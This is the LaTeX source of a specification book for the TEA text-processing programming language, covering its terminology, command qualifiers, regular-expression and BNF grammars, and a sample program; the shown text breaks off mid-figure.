%---[ TEMPLATE: BOOK | monograph | mini-treatise ]
%---|original-author:JWL|date:24SEPT2025|email:jwl@nuchwezi.com
%---|TITLE: TEA TAZ – Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION
%---|EDITOR:Prof. Joseph Willrich Lutalo, Oxford
%---[MANUSCRIPT-ORIGINAL-VERSION:24SEPT2025]
%---[MANUSCRIPT-LATEST-VERSION:21OCT2025]
%----------------------------------------------------------------|
%\documentclass[a4paper, 18pt]{article} % A4 paper, readable font size
\documentclass[a4paper, 18pt]{book} % A4 book-layout, readable font size

%\usepackage{parskip} % Adds vertical space between paragraphs
\setlength{\parindent}{0pt} % Removes paragraph indentation
\setlength{\parskip}{1em}   % Adds vertical space of 1em between paragraphs


%\documentclass[a4paper, 18pt]{book} % A4 paper, readable font size
\usepackage{geometry} % Adjust margins
\geometry{top=0.8in, bottom=0.8in, left=0.8in, right=0.6in} 

\usepackage[utf8]{inputenc}


% packages we'll need...

% for about author styling
\usepackage{setspace}

% allow table of contents to also list subsections
\setcounter{tocdepth}{2}

% for better appendices
\usepackage[title,titletoc]{appendix}

% for controlling page numbers
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
\fancyhead[R]{\thepage}

% throw in page-top header
\fancyhead[L]{TEA TAZ – Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION}

% for graphics
\usepackage{graphicx}
\usepackage{caption}
\usepackage{float}

%for multi-figure figures?
\usepackage{subcaption}


% for text-wrapping in verbatim environments
\usepackage{fvextra}
\RecustomVerbatimEnvironment{verbatim}{Verbatim}{breaklines, breakanywhere}

% for drawing text boxes

% for proper treatment of urls
\usepackage{hyperref}

% for tables
\usepackage{tabularx}

% for line-breaks in table cells
\usepackage{makecell}

% for diagonalsplit in table headers cell
\usepackage{diagbox}

% make table cells center vertically where we could have used p{1cm} -- we use m{1cm}
%\usepackage{array}
% alternatively, just use custom column type --- M{1cm}
%\newcolumntype{M}[1]{>{\centering\arraybackslash}m{#1}}

%\usepackage{makecell}
\renewcommand\arraystretch{1.3}

% for long tables
\usepackage{longtable}

%\usepackage{array}
%\usepackage{longtable}
%\usepackage{booktabs}
%\usepackage{multirow}

% for custom table col widths
%\usepackage{array}
%\newcolumntype{L}{>{\centering\arraybackslash}m{2cm}}
%\newcolumntype{M}{>{\centering\arraybackslash}m{5cm}}

% for json listings...
%\usepackage{listings}
%\usepackage{minted}
%\usemintedstyle{xcode}% no parser errors in listings?
%\usemintedstyle{bw} % grayscale color in listings, but shows parser errors!

% for highlighting text
\usepackage{xcolor, soul}
% then define colors we shall use:
\definecolor{myteal}{RGB}{0, 128, 128}
\definecolor{lightgray}{HTML}{CCCCCC}
\definecolor{myorange}{HTML}{FFD7B3}

% for table with alternating row bg colors 
\usepackage[table]{xcolor}
\definecolor{lightgray}{gray}{0.9}  % or use HTML/RGB if preferred


%\definecolor{highcolor}{rgb}{0,255,255} % our default hl color for background, friendly on black text foreground
\definecolor{highcolor}{rgb}{0,255,255} %a accent background color, must be friendly on black text foreground
\sethlcolor{highcolor}

%for regular expression and TEA code presentation in console-like text-boxes
\usepackage{tcolorbox}
\tcbuselibrary{listings,skins,breakable}
\usepackage{listings}

% style for general terminal-like listings
\tcbset{
  myterminalstyle/.style={
    colback=black,       % background color
    coltext=white,       % text color
    fontupper=\ttfamily, % typewriter font
    boxrule=0pt,         % no border
    arc=0pt,             % square corners
    outer arc=0pt,
    left=2mm, right=2mm, top=1mm, bottom=1mm,
    enhanced,
    sharp corners,
  }
}

% define listings config for TEA language
\lstdefinelanguage{TEA}{
  morecomment=[l]{\#},
  sensitive=true,
  alsoletter={:*!},
  %morekeywords=[1]{i:, u!:, g:, l:, f:, x:, j:, q!:},
  morekeywords=[1]{%
a:, a.:, a*:, a!:, a.*:, a.!:, a*!:, b:, b.:, b*:, b!:, b.*:, b.!:, b*!:, c:, c.:, c*:, c!:, c.*:, c.!:, c*!:, d:, d.:, d*:, d!:, d.*:, d.!:, d*!:, e:, e.:, e*:, e!:, e.*:, e.!:, e*!:, f:, f.:, f*:, f!:, f.*:, f.!:, f*!:, g:, g.:, g*:, g!:, g.*:, g.!:, g*!:, h:, h.:, h*:, h!:, h.*:, h.!:, h*!:, i:, i.:, i*:, i!:, i.*:, i.!:, i*!:, j:, j.:, j*:, j!:, j.*:, j.!:, j*!:, k:, k.:, k*:, k!:, k.*:, k.!:, k*!:, l:, l.:, l*:, l!:, l.*:, l.!:, l*!:, m:, m.:, m*:, m!:, m.*:, m.!:, m*!:, n:, n.:, n*:, n!:, n.*:, n.!:, n*!:, o:, o.:, o*:, o!:, o.*:, o.!:, o*!:, p:, p.:, p*:, p!:, p.*:, p.!:, p*!:, q:, q.:, q*:, q!:, q.*:, q.!:, q*!:, r:, r.:, r*:, r!:, r.*:, r.!:, r*!:, s:, s.:, s*:, s!:, s.*:, s.!:, s*!:, t:, t.:, t*:, t!:, t.*:, t.!:, t*!:, u:, u.:, u*:, u!:, u.*:, u.!:, u*!:, v:, v.:, v*:, v!:, v.*:, v.!:, v*!:, w:, w.:, w*:, w!:, w.*:, w.!:, w*!:, x:, x.:, x*:, x!:, x.*:, x.!:, x*!:, y:, y.:, y*:, y!:, y.*:, y.!:, y*!:, z:, z.:, z*:, z!:, z.*:, z.!:, z*!:,%
A:, A.:, A*:, A!:, A.*:, A.!:, A*!:, B:, B.:, B*:, B!:, B.*:, B.!:, B*!:, C:, C.:, C*:, C!:, C.*:, C.!:, C*!:, D:, D.:, D*:, D!:, D.*:, D.!:, D*!:, E:, E.:, E*:, E!:, E.*:, E.!:, E*!:, F:, F.:, F*:, F!:, F.*:, F.!:, F*!:, G:, G.:, G*:, G!:, G.*:, G.!:, G*!:, H:, H.:, H*:, H!:, H.*:, H.!:, H*!:, I:, I.:, I*:, I!:, I.*:, I.!:, I*!:, J:, J.:, J*:, J!:, J.*:, J.!:, J*!:, K:, K.:, K*:, K!:, K.*:, K.!:, K*!:, L:, L.:, L*:, L!:, L.*:, L.!:, L*!:, M:, M.:, M*:, M!:, M.*:, M.!:, M*!:, N:, N.:, N*:, N!:, N.*:, N.!:, N*!:, O:, O.:, O*:, O!:, O.*:, O.!:, O*!:, P:, P.:, P*:, P!:, P.*:, P.!:, P*!:, Q:, Q.:, Q*:, Q!:, Q.*:, Q.!:, Q*!:, R:, R.:, R*:, R!:, R.*:, R.!:, R*!:, S:, S.:, S*:, S!:, S.*:, S.!:, S*!:, T:, T.:, T*:, T!:, T.*:, T.!:, T*!:, U:, U.:, U*:, U!:, U.*:, U.!:, U*!:, V:, V.:, V*:, V!:, V.*:, V.!:, V*!:, W:, W.:, W*:, W!:, W.*:, W.!:, W*!:, X:, X.:, X*:, X!:, X.*:, X.!:, X*!:, Y:, Y.:, Y*:, Y!:, Y.*:, Y.!:, Y*!:, Z:, Z.:, Z*:, Z!:, Z.*:, Z.!:, Z*!:%
},
  keywordstyle=[1]\color{green},
  commentstyle=\color{lightgray},
  morestring=[b]",
stringstyle=\color{myorange},
moredelim=[s][\color{myorange}]{\{}{\}},
}


% define custom terminal for TEA language snippets

\tcbset{
  teaterminalstyle/.style={
    enhanced,
    colback=myteal,
    coltext=white,
    fontupper=\ttfamily,
    boxrule=0pt,
    arc=0pt,
    outer arc=0pt,
    left=2mm, right=2mm, top=1mm, bottom=1mm,
    sharp corners,
    listing only,
    listing options={
      language=TEA,
     basicstyle=\ttfamily,
%keywordstyle=\color{cyan}\bfseries,
%commentstyle=\color{green}\itshape,
%stringstyle=\color{yellow}
    }
  }
}


% from google-gemini for verbatim listings:
\tcbuselibrary{listings,breakable}

% Define a language with no syntax highlighting
\lstdefinelanguage{none}{}

% Define a new tcblisting environment for verbatim content
\newtcblisting{tcbverbatim}[1][]{
  % Pass any user options to the new environment
  #1,
  breakable, % Allow long lines to wrap
  listing only, % The box contains only a listing
  listing options={
    language=none, % The 'none' language disables highlighting
    basicstyle=\ttfamily, % Use the typewriter font
    columns=flexible, % Allow flexible column widths for wrapping
    breaklines=true, % Enable line breaking
  },
}


% for maths
\usepackage{amsmath}
% for number sets symbols
\usepackage{amssymb}
%\usepackage{ntheorem}
\usepackage{amsthm}

\usepackage{tikz} % for v-aligned matrices with arrows between them
\usetikzlibrary{matrix, positioning} % ← This line is essential


% extra symbols
\usepackage{textgreek}
%\usepackage{mnsymbol}

% for writing our theorems and defs...
\newtheorem{comp}{Computation}
\newtheorem{theo}{Theorem}
\newtheorem{defn}{Definition}
\newtheorem{lem}{Lemma}
\newtheorem{prop}{Proposition}
\newtheorem{axiom}{Axiom}
\newtheorem{post}{Postulate}
\newtheorem{trans}{Transformation}
\newtheorem{transf}{Transformer}
\newtheorem{law}{Law}
\newtheorem{prob}{Problem}
\newtheorem{soln}{Solution}
\newtheorem{alg}{Algorithm}




% for wrapping text around floats
\usepackage{wrapfig}

% to include pdf pages
\usepackage{pdfpages}

% for multiline comments...
%\newcommand{\comment}[1]{}

% for the cardinality symbol
\newcommand{\invpi}{\rotatebox[origin=c]{180}{$\pi$}}

\title{\textbf{TEA TAZ} – \textbf{T}ransforming \textbf{E}xecutable \textbf{A}lphabet A: to Z: COMMAND SPACE SPECIFICATION}


\author{Willrich J. Lutalo\thanks{Inventor of the TEA language, also currently a volunteering \& Independent Principal Investigator at Nuchwezi Research --- \url{https://nuchwezi.com}}\\
\texttt{joewillrich@gmail.com, jwl@nuchwezi.com}}

\date{\today}


\begin{document}

%---[ START BOOK CONTENT/FRONT ]
\frontmatter

% insert [front] cover --- could just be a PNG or PDF
\includepdf[pages=1]{../taz_front_cover.pdf}


% insert I*POW frontmatter
\includepdf[pages=-]{resources/pdfs/FrontisMatter.pdf}



\maketitle

\chapter*{Dedication}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.8\textwidth}}
I:\{\textbf{Dedicate this book to Dr. Marriette of Makerere University, CoCIS graduate school.} When she first taught me LISP on the white-board, during my masters class on advanced computer programming --- \textbf{MCN7105}:``Structure and Interpretation of Computer Programs", I felt like a special mini-universe of computing had been hidden from me all along. \textit{Exposure to not just a different, albeit uncommon syntax and abstraction approach to computational problem solving she passed down to me, and somewhat helped spur my interest further, into exploring non-mainstream programming languages. Also, I recall when I first encountered a serious non-C-family language, RUBY by Matz, first exposed to me by Revence Kalibwani (R*I*P), I never looked back, and now I have a truly elegant, fully functional non-C-family computer programming language of my own, several years down the road.}\}
\begin{verbatim}
|U:|A:|V:C|A*:C 
\end{verbatim}
\\
	\hline
	              
\end{tabular}
  \label{TABDEDC}
\end{table}

\tableofcontents

\listoffigures

\listoftables

\newpage

\Large



% Title for the section
\chapter*{List of ACRONYMS}
\addcontentsline{toc}{chapter}{List of Abbreviations}
\label{CHAPACRONYMNS}

% Longtable for abbreviation list
\begin{longtable}{p{3cm} p{12cm}}
\textbf{ABBR.} & \textbf{Definition} \\
\hline
\endfirsthead

\textbf{ABBR.} & \textbf{Definition} \\
\hline
\endhead

% Add your abbreviations below

\textbf{BASH} & Bourne Again Shell \\

\textbf{BNF} & Backus–Naur Form \\

\textbf{CGF} & Context-Free Grammar\\

\textbf{IDE} & Integrated Development Environment\\

\textbf{I*POW} & International Portfolio of Writers \\

\textbf{JSON} & JavaScript Object Notation \\

\textbf{MSS} & Model Sequence Statistic \\

\textbf{\textit{o}-SSI} & \textit{orthogonal}-Symbol Set Identity \\

\textbf{RNG} & Random Number Generator  \\

\textbf{RSG} & Random Sequence Generator  \\

\textbf{TC} & TEA Command \\

\textbf{TCD} & TEA Command Delimiter\\
 
\textbf{TCOM} & TEA Comment\\
 
\textbf{TCQ} & TEA Command Qualifier\\
 
\textbf{TEA} & Transforming Executable Alphabet\\
 
\textbf{TI} & TEA Instruction\\
 
\textbf{TID} & TEA Instruction Delimiter\\
 
\textbf{TIL} & TEA Instruction Line\\

\textbf{TIPE} & TEA Instruction Parameter Expression\\

\textbf{TIPED} & TEA Instruction Parameter Expression Delimiter\\

\textbf{TOE} & TEA Opaque Expression\\

\textbf{TPC} & TEA Primitive Command\\

\textbf{WSL} & Windows Subsystem for Linux\\




\end{longtable}




%---[ BEGIN BOOK CONTENT/CHAPTERS ]

\mainmatter

%\begin{abstract}
\chapter*{Abstract}
\large

This manuscript builds upon the earlier TEA language formalization and specification work in J. Willrich Lutalo's PhD research diary \cite{lutalo2024tea}. For all practical purposes, this document is best treated as a living document; it is continually being enhanced as TEA evolves, but must also be considered the official, authoritative formal reference on matters concerning the definition, grammar, semantics, and processing of TEA programs. 
     \newline\newline
     \textbf{Keywords}: Software Engineering, Software Language Engineering, Language Definition, Instruction Set, Developer Manual, Software Debugging, TEA Programming.
%\end{abstract}

\newpage

\chapter{Introduction}
\label{SEC1}

Computers are abstractions that help humans solve problems via other abstractions known as software programs, which are implemented using other abstractions known as software languages. The Transforming Executable Alphabet (TEA) language, is a general-purpose computer programming language that is text-processing oriented, is currently implemented as an interpreted language for both the WEB (internet) and SYSTEM (as standalone or embeddable)\footnote{Though we shall cover more about this in a later section of the TAZ, note that the TEA language currently comes in two flavours --- two, because, even though the entire TEA instruction set A: to Z: is almost standard and works the same irrespective of platform where a TEA program is run, and yet, in practice, and particularly for programs using the \textbf{Z:} command space, there are unavoidable differences in the powers and capabilities one can access and or leverage from the external environment via the \textbf{ZAP} facility --- \texttt{z:CMD}, \texttt{z*:vCMD} and related \textit{external system command execution} variants of that TEA instruction that one might wish to use. In particular, the \textbf{WEB TEA}/TEA running in a web-browser programs can use external powers via JavaScript, but yet, commandline versions can mostly use the system/shell interface of the host system only. More about this when we come to \textbf{Z:} later.}. And in this manual, we shall understand its origins, purpose, design, implementation, applications [and applicability] as well as get glimpses of what its future is likely to be.

\section{Essential Nomenclature and Concepts}
\label{SECNOMEN}

For the rest of this document, the following definitions and clarifications are important:\\

\begin{enumerate}
\item{ \textbf{TEXT:} In the TEA computer programming language, Text is considered to be any form of data a TEA program can process and reason about. \textbf{All TEA programs process only Text.}}
\item{ 
\textbf{STRINGS:} Let us assume a finite sequence of distinct characters from a finite set such as Unicode-8 or ASCII. This is the alphabet understood and processed by TEA programs. Let us call any such finite sequence, for example {a,b,c,d, ,f} the string “abcd f”, and for TEA programs, we shall typically write an explicit string---such as “a b c”, as an expression expressing the exact character and position---thus order, it occupies in the string, by either the common syntax “a b c” (such as some programming languages do… Java, Python and C), but for TEA, we shall also allow, in-fact, recommend that we express all strings in a program source-code using the earlier syntax; {abc f}. For TEA programs, all data is presented as Text, and at the source-code or even run-time level, data being processed by a TEA program is expected to be, and is treated as a string.
}
\item{
\textbf{REGULAR EXPRESSIONS:} Because TEA is a Text Processing language at core, it means, advanced text processing power and capabilities need be built within the language by design. Among these is the ability to automatically discover patterns in strings and then do things based on or to them. A kind of intelligent or controllable and directable processing. For pattern matching and pattern-based conditional processing, TEA programs employ the concept and mechanics of Regular Expressions. For clarification purposes while reading this TEA specification as well as future literature and TEA source code built based on this standard, TEA regular expressions are to be written in a TEA program without any explicit delimiters except the standard TEA Parameter Expression Delimiter (refer to Figure 1) “:” ---to defer from strings. Thus, where it is expected to write an explicit regular expression (also typically referred to as a REGEX in this specification) such as \texttt{\^{}\$} to denote the REGEX used to match the empty string, typically expressed as “”, shall likewise be written as \texttt{\^{}\$} when being expressed within a TEA program source code --- particularly so, in parts of TEA instructions where the instruction signature dictates that the argument or parameter is expected to be a literal regular expression. However, the same, when being expressed or being passed around in a TEA program, shall instead be written as \texttt{\{\^{}\$\}} or perhaps ``\texttt{\^{}\$}". Of course, it would have been possible to actually write both explicit strings and regular expressions using the same simple and bare syntax---for example, with the discarding of the string delimiting characters “ and ” for the typical, and \{ and \} for TEA, but sometimes it is safer to sacrifice mathematical elegance while writing a program, and instead secure useful program source-code properties such as readability, program comphrensibility and lexical correctness – for both the human writing the code – such as we expect most TEA programs shall be, and the machines meant to read, parse and process things based on human-written TEA program source code.
}
\item{
\textbf{AI:} Active Input --- This refers to the main input or data to be referred to or processed by the current TEA Program instruction at the time it is being evaluated.
IO: Instruction Output --- This refers to the main output or data to be returned by the current TEA Program instruction after it is fully executed.
}
\item{
\textbf{WORD:} This refers to a sequence of non-whitespace characters.
}
\item{
\textbf{TEA PRIMITIVE:} Also the same as “TEA Primitive Command” or “TEA Canonical Command”, is any one of the letters in the Latin Alphabet, a to z or A to Z, followed by a single colon “:” character, and the letter used determines what purpose a TEA instruction has in a program. Also, each primitive has unique semantics as defined in the TEA Command Space specification. It is important to note that in TEA, much as the standard style is to use lowercase letters for TEA primitives such as “a:” or “m:”, yet, case doesn’t matter, and “a:” and “A:” are basically equivalent, but “a:” and “A!:” aren’t, much as they reference the same basic TEA primitive “a”. In a TEA primitive such as “a:”, we may refer to the command letter “a” as the “Command Character”.
}
\item{

\textbf{TEA INVERSE:} When any of the TEA primitives such as “a:” has the command character followed by a TEA Command Qualifier such as the exclamation mark “!” or star-character “*”, such as with “a!:” or “g*:”, it is then considered to be the inverse or alternate form of the implied primitive. So, “a!:” is the alternate form of the command “a:”, and unless where specified, typically the canonical form of a TEA primitive, such as “a:” has different effects and purpose from its inverse form “a!:”
}
\item{
\textbf{INERT or UNDEFINED TEA COMMAND:} When a TEA Command is flagged as or defined as “INERT” or “UNDEFINED” or “RESERVED”, it means that command or its implied form has no effect in a standard TEA program, and can be ignored by the TEA processor when the program is being executed. Typically, this occurs with the special treatment of Inverse forms of a TEA primitive, such as when “a:” is defined, but “a!:” is not or when “a:” is, but “a:WITH PARAMETERS” isn’t. Also, sometimes a command might have one of its parameterized forms (but not all of them) undefined or INERT. For example:
\begin{itemize}
\item \texttt{V:}
\item \texttt{V:VAULT\_NAME}
\item \texttt{V:VAULT\_NAME:VAULT\_VALUE}
\end{itemize}

are all defined, but \texttt{V:VAULT\_NAME:VAULT\_VALUE:OTHER\_ARGUMENT} isn't. Typically, where for example a primitive such as “a:” is defined but its parameterized form isn’t, it could be safe to assume that “a:WITH PARAMETERS” shall simply be ignored and not have effect in the program, much as “a:” is defined and would cause an effect in the program. In an advanced TEA program environment, using or writing an INERT form of a TEA command should either be flagged or reported as an error. Otherwise, typically, the safe judgment to make concerning INERT commands is that they shouldn’t and won’t modify or affect the AI, and thus, should transparently return the AI as IO, and thus can be considered to be non-existent in a TEA program.
}
\end{enumerate}


\subsection{TEA Command Variations and Qualifying TEA Commands Correctly}

So, based on the grammar rules by which we can form valid TEA Instructions (see \textbf{\autoref{FIG1}}), we know that, in total, we can have \textbf{208 possible TEA Commands}. We arrive at that number as such:

\begin{enumerate}
\item Each TC consists of a single element from $\psi_{az}$ --- so that's $26 \times 2$ --- since we allow both upper case and lower case letters $\rightarrow 52$.
\item{Each TC can be qualified, and thus, can be terminated/suffixed with one of the following TCQ options:

\begin{enumerate}
\item \texttt{} --- essentially, no TCQ (plain): so that, if TC is ``A", we get ``A:", if ``B", then ``B:", etc.
\item \texttt{.} --- essentially, if TC is ``A", we get ``A.:", if ``B", then ``B.:" etc.
\item \texttt{*}
\item \texttt{!}
\item \texttt{.*}
\item \texttt{.!}
\item \texttt{*!} --- essentially, if TC is ``A", we get ``A*!:", if ``B", then ``B*!:" etc.
\end{enumerate}

Which gives us \textbf{7 TCQ variants}, and thus a total of $52 \times 7 \rightarrow 364$ TEA Command Variations.
}
\end{enumerate}

Thus, without delving directly here into what each of those TEA Commands does, which ones are INERT and which are not, what \textbf{instruction signatures} each supports or allows\footnote{Some TC might accept just one parameter or argument, while others might allow two or more --- delimited by ``:".} etc --- stuff we are going to cover well once we dive into the breakdown of each TEA primitive command's specification and semantics (which is exactly what the TEA TAZ is about), we at least know, we have a total of 364 possible distinct TEA commands to explore! That alone, definitely justifies the need for this manual, and an insight into the details of each of the 26 TP, a: to z:\footnote{Of course, not to loose hope for those who wish to memorize the entire TEA instruction set or the TAZ --- especially because, unlike many other programming languages out there, for TEA, which has a fixed library/instruction set, it's possible, and we know that, since a: and A: are equivalent, or that any TC with some particular primitive say, K:, is equivalent to the variant with the same primitive just in a different case, thus, instead of a total of 364 commands, TEA essentially supports $26 \times 7 \rightarrow 182$ distinct commands.}



\chapter{THE TEA LANGUAGE DEFINITION}
\label{SEC2}

The Transforming Executable Alphabet (TEA) language, is a formal, regular, computable and Turing Complete programming language specified formally by the grammars we shall see in this section. As with regular, formal languages, we can then use TEA to express formal statements or expressions in its language and using its formal syntax and semantics, that could be either individual instructions that do just one thing, or entire collections of them arranged and structured coherently, that specify how a particular or general kinds of tasks might be solved --- these are typically, or more technically known as automatons, or rather, computer programs, capable of running on any Turing Machine or Abstract Machine capable of interpreting or processing the TEA formal language in this case.


\section{TEA Lexical and Syntax Grammars}
\label{SECGRAM}

First, we shall consider the lexical structure of TEA programs.

Essentially, all TEA programs, in their simplest, unminified form\footnote{That is, without 
``\texttt{|}" delimiters between individual TEA instructions  instead of the NEW LINE \texttt{\textbackslash n} character.} consist of one or more TEA Instructions, and where each TEA Instruction Line (TIL) conforms to the following simplified \textbf{lexical specification} specified using the formal language of \textbf{Regular Expressions}:



\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (Regular Expression)]
  \begin{lstlisting}
^\s*[a-zA-Z](?:[.!*]|(?:\*!))?:.*$
  \end{lstlisting}
  \end{tcolorbox}
  \caption{The TEA Instruction Lexical Specification (regular language)}
  \label{FIG1}
\end{figure}

    

And then, with simplification, all TEA Programs (containing one or more TILs, and potentially minified), conform to the following syntax specification\footnote{Also referred to as ``Lexical Grammar" in some contexts.} expressed using regular expressions to:


    
    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (Regular Expression)]
  \begin{lstlisting}
([a-zA-Z]\.?\*?!?:.*(:.*)*\|?)+(#.*)*
  \end{lstlisting}
  \end{tcolorbox}
  \caption{The TEA Program Lexical Specification (regular language)}
  \label{FIG2}
\end{figure}


Essentially, in \textbf{\autoref{FIG1}}, we see the final, most generic lexical specification of any legitimate TEA Instruction (TI), and the implication is that a TEA program consists of one or more TI – with or without TEA comments (more about this later). We see that a TEA Instruction obeys the following lexical and baseline-syntax rules:

\begin{enumerate}
\item \textbf{The instruction starts with a single letter from Latin alphabet} --- $\psi_{az} = \langle a, b, c, ..., y, z \rangle$, and that the case of the letter doesn't matter. This letter is what is called a \textbf{TEA Primitive Command} (TPC).
\item \textbf{After the TPC, we might optionally have} a dot (.), an exclamation mark (!), an asterisk (*) or an ordered pairwise combination of them; (.!) or (.*) or (*!) but not (.*!). These are refered to as \textbf{TEA Command Qualifiers} (TCQ), and nothing else after the TPC and TCQ except the full colon (:)---a \textbf{TEA Command Delimiter} (TCD). When the TPC is followed by TCQ we then call that command the \textbf{Inverse} or \textbf{Alternate} form of the TPC.
\item After the TCD, everything that follows until the end of the line or until the vertical bar character (\verb!|!)---the \textit{TI Delimiter} (TID)\footnote{Concerning the TID, earlier ideas had included the possibility of delimiting multiple TI expressions, possibly on the same line, using either the (;) or (,) characters.} is a \textbf{TI Parameter Expression} (TIPE).
\item TIPE consists of one or more characters excluding the \textbf{TIPE Delimiter} (TIPED) symbol--- also called ``\textbf{TEA Parameter Expression Delimiter}", which is the full colon, ``:", just like the TCD, followed by one or more TIPE.
\item After the TID, and on the same line, everything that follows is either another TI or is something essentially treated as either whitespace or a comment---thus a \textbf{TEA Opaque Expression} (TOE).
\item Taken together, the TCP$\cdot$TCQ$\cdot$TCD specify a \textbf{TEA Command} (TC), and TC$\cdot$TIPE specifies a complete \textbf{TEA Instruction Line} (TIL)
\item When a line in a TEA program doesn't start with a valid TC with or without leading white space, such a line is treated as or interpreted as TOE.
\item All TOE in a TEA program are essentially \textbf{TEA Comments} (TCOM), and aren't processed by the TEA interpreter\footnote{And thus, can be safely eliminated when a TEA program is either sanitized or minified.}.
\end{enumerate}

In summary, a TIL, and thus a TI, can be produced thus:

    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (Simple Grammar)]
  \begin{verbatim}
	    TIL := WS*•TI•TI*•TOE•EOL
	    WS := White Space
	    TI := WS*•TC•TIPE•TID
	    TC := TCP•TCQ•TCD
	    TCP := [a-zA-Z]
	    TCQ := . | ! | * | *!  
	    TCD := :
	    TIPE := NTIPED•(TIPED•NTIPED*)*
	    TIPED := :
	    NTIPED := [^:]*
	    TID := |
	    TOE := NEOL* | TCOM
	    NEOL := [^\n]*
	    TCOM := #NEOL
	    EOL := NLC | NLC•CR
	    NLC := New Line Character
	    CR := Carriage Return
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Instruction Context Free Grammar in Simple Form (context-free language)}
  \label{FIG3}
\end{figure}


For purists especially, the same can be rewritten in true/traditional Backus–Naur Form (BNF) as follows:


    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (BNF Grammar)]
  \begin{verbatim}
		<TIL> ::= <WS_List> <TI> <TI_List> <TOE> <EOL>
		
		<WS_List> ::= <WS> <WS_List> | ε
		<TI_List> ::= <TI> <TI_List> | ε
		
		<WS> ::= "White Space"
		
		<TI> ::= <WS_List> <TC> <TIPE> <TID>
		
		<TC> ::= <TCP> <TCQ> <TCD>
		<TCP> ::= "a" | "b" | ... | "z" | "A" | "B" | ... | "Z"
		<TCQ> ::= "." | "!" | "*" | "*!"
		<TCD> ::= ":"
		
		<TIPE> ::= <NTIPED> <TIPE_Tail>
		<TIPE_Tail> ::= <TIPED> <NTIPED_List> | ε
		<NTIPED_List> ::= <NTIPED> <NTIPED_List> | ε
		
		<NTIPED> ::= any character except ":"
		
		<TIPED> ::= ":"
		
		<TID> ::= "|"
		
		<TOE> ::= <NEOL_List> | <TCOM>
		<NEOL_List> ::= <NEOL> <NEOL_List> | ε
		<NEOL> ::= any character except newline
		
		<TCOM> ::= "#" <NEOL>
		
		<EOL> ::= <NLC> | <NLC> <CR>
		<NLC> ::= "New Line Character"
		<CR> ::= "Carriage Return"
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TIL CFG in BNF}
  \label{FIG4}
\end{figure}


Where TIL is a \textbf{TEA Instruction Line}, and thus a \textbf{TEA Program} (TP) can be fully produced thus:


   \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (Simple Grammar)]
  \begin{verbatim}
	    TP := TIL • (TOL* • TIL*)*
	    TOL := TOE • EOL | TCOML
	    TCOML := WS* • TCOM • EOL
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Program Context Free Grammar in Simple Form}
  \label{FIG5}
\end{figure}

In traditional BNF, we have:


   \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (BNF Grammar)]
  \begin{verbatim}
		<TP> ::= <TIL> <TP_Tail>
		<TP_Tail> ::= <TOL_List> <TIL_List> <TP_Tail> | ε
		
		<TOL_List> ::= <TOL> <TOL_List> | ε
		<TIL_List> ::= <TIL> <TIL_List> | ε
		
		<TOL> ::= <TOE> <EOL> | <TCOML>
		
		<TCOML> ::= <WS_List> <TCOM> <EOL>
		<WS_List> ::= <WS> <WS_List> | ε
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Program CFG in BNF (context-free language)}
  \label{FIG6}
\end{figure}


Where TOL is a \textbf{TEA Opaque Line}---essentially a line in a TEA program that can be entirely ignored by the TEA parser, processor or interpreter because it either consists of only TOE (TEA Opaque Expression) or TCOM (and thus is a TCOML). Thus do we now have a full, and complete specification of the TEA programming language syntax. This should help with lexing TEA program source code\footnote{Those not computer scientists, lexing is how we can automatically break apart a given TEA program source-code into meaningful bits or tokens, and thus be able to verify or validate the program against the language specification or formal grammar, even without having to execute or run the program. It is very vital in situations such as Static Program Analysis and Verification, but also in Code Beautification or Syntax Highlighting as part of a TEA Code Pretty Printer --- typical aspects of a mature programming language's formal language support tools.}, and thus parsing TEA Programs\footnote{Those interested, traditional parsers typically operated on some form of CFG of a language after it has been lexxed, such as when the grammar is expressed as a token tree or such. However, those are mostly implementation-specific details, and also dependent on whether the language is compiled or interpreted. TEA is currently manifested as an interpreted language, and those interested in studying the TEA parser, can visit the reference implementation on GitHub\cite{cli_tttt} to explore.}. However, as for the semantics of any given TEA program, it is important to combine knowledge of valid TEA program syntax, as well as the valid syntax and semantics of each individual TEA primitive command space. This is specified in the TEA A: to Z: Command Space Specification section of the TAZ.

\section{Quirks of the TEA Parser: Parsing and Processing Multi-line TI and Multiple TI On A Single Line}
\label{SECPARSE}

The minimal TEA language grammar defined in the previous section might not readily capture or express one small quirk about how TEA programs might be written in practice – such as when TI spans more than one line --– an example being when a string parameter being passed to an instruction in the source code has to span multiple lines, or when a TEA comment needs do the same. The other quirky case is when multiple TI need be expressed on a single line –-- something which might not be immediately obvious by merely looking at the TEA language grammar.


An example TEA program that highlights these syntactic quirks follows…

  \begin{figure}[H]
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program]
  \begin{lstlisting}[language=TEA, caption={TP 1}, label={LST1}, numbers=left]
i: {This is a multi-line
string} | # followed by comment
u!: | g:
l:E | x:{1-}
f:^1-i:A:B | l:A | x!:-1 | j:C | l:B | i!:"T" | j:E
l:C | q!:
#(=1-isltnThamu-erg-1, VAULTS:{"vIN":"This is a multi-line\nstring"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Sample TEA Program demonstrating most quirks of a non-trivial TEA Program}
  \label{FIG7}
\end{figure}

And the same exact program as in  \textbf{\autoref{LST1}}, when stripped of all TEA comments and other extraneous, non executable stuff, and all new lines delimiting TEA instructions replaced by the standard TEA instruction delimiter, ``\texttt{|}", becomes as what we see in \textbf{\autoref{LST2}}

 \begin{figure}[H]
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program]
